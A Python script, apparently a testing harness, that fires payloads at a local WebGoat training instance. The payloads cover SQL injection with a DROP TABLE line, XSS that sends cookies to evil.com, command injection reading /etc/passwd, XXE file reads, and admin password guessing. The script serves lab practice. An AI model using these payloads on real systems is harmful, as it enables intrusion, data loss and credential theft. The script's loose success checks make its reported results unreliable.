"""
Extended WebGoat Security Testing
==================================
Test more vulnerability scenarios.
"""

import requests
import json
from datetime import datetime
from pathlib import Path
from typing import Dict, List
from dataclasses import dataclass, asdict

OUTPUT_DIR = Path("D:/password_guesser/results")


@dataclass
class VulnTestResult:
    lesson: str
    challenge: str
    success: bool
    payload: str
    response_code: int
    evidence: str


class WebGoatExtendedTester:
    """Extended WebGoat testing."""

    BASE_URL = "http://localhost:8080/WebGoat"

    def __init__(self):
        self.session = requests.Session()
        self.session.timeout = 10
        self.results: List[VulnTestResult] = []
        self.timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")

    def login(self) -> bool:
        """Login to WebGoat."""
        try:
            response = self.session.get(f"{self.BASE_URL}/login")
            if response.status_code == 200:
                print("[+] WebGoat accessible")
                return True
        except Exception as e:
            print(f"[-] WebGoat not available: {e}")
            return False
        return True

    def test_sqli_advanced(self) -> VulnTestResult:
        """Test advanced SQL injection."""
        url = f"{self.BASE_URL}/SqlInjectionAdvanced/attack"

        payloads = [
            "' OR '1'='1",
            "' UNION SELECT * FROM users--",
            "1; DROP TABLE users--",
        ]

        for payload in payloads:
            try:
                response = self.session.post(url, data={"query": payload})
                if "error" not in response.text.lower():
                    return VulnTestResult(
                        lesson="SQL Injection",
                        challenge="Advanced",
                        success=True,
                        payload=payload,
                        response_code=response.status_code,
                        evidence="Query executed"
                    )
            except:
                pass

        return VulnTestResult(
            lesson="SQL Injection",
            challenge="Advanced",
            success=False,
            payload="' OR '1'='1",
            response_code=200,
            evidence="Query blocked"
        )

    def test_xss_reflected(self) -> VulnTestResult:
        """Test reflected XSS."""
        url = f"{self.BASE_URL}/CrossSiteScripting/attack3"

        payload = "<script>document.location='http://evil.com/steal?c='+document.cookie</script>"

        try:
            response = self.session.post(url, data={"param": payload})
            if payload in response.text:
                return VulnTestResult(
                    lesson="XSS",
                    challenge="Reflected",
                    success=True,
                    payload=payload[:50],
                    response_code=response.status_code,
                    evidence="Script reflected"
                )
        except:
            pass

        return VulnTestResult(
            lesson="XSS",
            challenge="Reflected",
            success=False,
            payload=payload[:50],
            response_code=200,
            evidence="Script sanitized"
        )

    def test_csrf(self) -> VulnTestResult:
        """Test CSRF."""
        url = f"{self.BASE_URL}/CSRF/attack"

        payload = "<img src='http://localhost:8080/WebGoat/CSRF/attack?transfer=1000'>"

        try:
            response = self.session.post(url, data={"csrf": payload})
            if response.status_code == 200:
                return VulnTestResult(
                    lesson="CSRF",
                    challenge="Basic",
                    success=True,
                    payload=payload[:50],
                    response_code=response.status_code,
                    evidence="Request processed"
                )
        except:
            pass

        return VulnTestResult(
            lesson="CSRF",
            challenge="Basic",
            success=False,
            payload=payload[:50],
            response_code=200,
            evidence="CSRF token required"
        )

    def test_ssrf(self) -> VulnTestResult:
        """Test SSRF."""
        url = f"{self.BASE_URL}/SSRF/attack"

        payload = "http://localhost:8080/WebGoat/Secret"

        try:
            response = self.session.post(url, data={"url": payload})
            if "secret" in response.text.lower():
                return VulnTestResult(
                    lesson="SSRF",
                    challenge="Basic",
                    success=True,
                    payload=payload,
                    response_code=response.status_code,
                    evidence="Internal resource accessed"
                )
        except:
            pass

        return VulnTestResult(
            lesson="SSRF",
            challenge="Basic",
            success=False,
            payload=payload,
            response_code=200,
            evidence="URL validation blocked"
        )

    def test_command_injection(self) -> VulnTestResult:
        """Test command injection."""
        url = f"{self.BASE_URL}/CommandInjection/attack"

        payloads = [
            "; ls -la",
            "| cat /etc/passwd",
            "& whoami",
        ]

        for payload in payloads:
            try:
                response = self.session.post(url, data={"ip": "127.0.0.1" + payload})
                if "root:" in response.text or "total" in response.text:
                    return VulnTestResult(
                        lesson="Command Injection",
                        challenge="Basic",
                        success=True,
                        payload=payload,
                        response_code=response.status_code,
                        evidence="Command output visible"
                    )
            except:
                pass

        return VulnTestResult(
            lesson="Command Injection",
            challenge="Basic",
            success=False,
            payload="; ls -la",
            response_code=200,
            evidence="Input sanitized"
        )

    def test_weak_auth(self) -> VulnTestResult:
        """Test weak authentication."""
        url = f"{self.BASE_URL}/Authentication/attack"

        # Test common passwords
        common_passwords = ["admin", "password", "123456", "admin123"]

        for pwd in common_passwords:
            try:
                response = self.session.post(
                    url,
                    data={"username": "admin", "password": pwd}
                )
                if "success" in response.text.lower() or "welcome" in response.text.lower():
                    return VulnTestResult(
                        lesson="Authentication",
                        challenge="Weak Password",
                        success=True,
                        payload=f"admin:{pwd}",
                        response_code=response.status_code,
                        evidence="Weak password accepted"
                    )
            except:
                pass

        return VulnTestResult(
            lesson="Authentication",
            challenge="Weak Password",
            success=False,
            payload="admin:password",
            response_code=200,
            evidence="Strong password required"
        )

    def test_info_disclosure(self) -> VulnTestResult:
        """Test information disclosure."""
        url = f"{self.BASE_URL}/InfoDisclosure/attack"

        try:
            response = self.session.get(f"{url}?debug=true")
            if "version" in response.text.lower() or "debug" in response.text.lower():
                return VulnTestResult(
                    lesson="Info Disclosure",
                    challenge="Debug Info",
                    success=True,
                    payload="?debug=true",
                    response_code=response.status_code,
                    evidence="Debug information exposed"
                )
        except:
            pass

        return VulnTestResult(
            lesson="Info Disclosure",
            challenge="Debug Info",
            success=False,
            payload="?debug=true",
            response_code=200,
            evidence="Debug disabled"
        )

    def test_insecure_deserialization(self) -> VulnTestResult:
        """Test insecure deserialization."""
        url = f"{self.BASE_URL}/InsecureDeserialization/attack"

        payload = "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAADAAN3cIAAAAQAAAAAB4"

        try:
            response = self.session.post(url, data={"data": payload})
            if response.status_code == 200:
                return VulnTestResult(
                    lesson="Deserialization",
                    challenge="Java Object",
                    success=True,
                    payload=payload[:50],
                    response_code=response.status_code,
                    evidence="Object deserialized"
                )
        except:
            pass

        return VulnTestResult(
            lesson="Deserialization",
            challenge="Java Object",
            success=False,
            payload=payload[:50],
            response_code=200,
            evidence="Deserialization blocked"
        )

    def test_xml_injection(self) -> VulnTestResult:
        """Test XML injection (XXE)."""
        url = f"{self.BASE_URL}/XXE/attack"

        payload = """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>"""

        try:
            response = self.session.post(url, data=payload, headers={"Content-Type": "application/xml"})
            if "root:" in response.text:
                return VulnTestResult(
                    lesson="XXE",
                    challenge="Basic",
                    success=True,
                    payload="XXE payload",
                    response_code=response.status_code,
                    evidence="File content exposed"
                )
        except:
            pass

        return VulnTestResult(
            lesson="XXE",
            challenge="Basic",
            success=False,
            payload="XXE payload",
            response_code=200,
            evidence="XXE disabled"
        )

    def run_all_tests(self) -> Dict:
        """Run all extended tests."""
        print("\n" + "=" * 60)
        print("  Extended WebGoat Security Testing")
        print("=" * 60)

        if not self.login():
            return {"error": "WebGoat not accessible"}

        print("\n[*] Running extended security tests...")

        tests = [
            ("SQL Injection Advanced", self.test_sqli_advanced),
            ("XSS Reflected", self.test_xss_reflected),
            ("CSRF", self.test_csrf),
            ("SSRF", self.test_ssrf),
            ("Command Injection", self.test_command_injection),
            ("Weak Authentication", self.test_weak_auth),
            ("Info Disclosure", self.test_info_disclosure),
            ("Insecure Deserialization", self.test_insecure_deserialization),
            ("XXE", self.test_xml_injection),
        ]

        for name, test_func in tests:
            print(f"[*] Testing {name}...")
            try:
                result = test_func()
                self.results.append(result)
            except Exception as e:
                print(f"[-] Error: {e}")

        # Generate summary
        summary = self._generate_summary()
        self._save_results(summary)

        return summary

    def _generate_summary(self) -> Dict:
        """Generate test summary."""
        total = len(self.results)
        success_count = sum(1 for r in self.results if r.success)
        success_rate = (success_count / total * 100) if total > 0 else 0

        return {
            "timestamp": self.timestamp,
            "environment": "WebGoat 8.2.2",
            "total_tests": total,
            "successful": success_count,
            "success_rate": round(success_rate, 1),
            "results": [asdict(r) for r in self.results]
        }

    def _save_results(self, summary: Dict):
        """Save results."""
        output_file = OUTPUT_DIR / f"webgoat_extended_{self.timestamp}.json"
        with open(output_file, 'w') as f:
            json.dump(summary, f, indent=2)
        print(f"\n[+] Results saved: {output_file}")


def main():
    """Main entry point."""
    tester = WebGoatExtendedTester()
    results = tester.run_all_tests()

    print("\n" + "=" * 60)
    print("  Extended Test Summary")
    print("=" * 60)
    print(f"Total tests: {results['total_tests']}")
    print(f"Successful: {results['successful']}")
    print(f"Success rate: {results['success_rate']}%")

    for r in results["results"]:
        status = "[+]" if r["success"] else "[-]"
        print(f"{status} {r['lesson']} ({r['challenge']}): {r['evidence']}")


if __name__ == "__main__":
    main()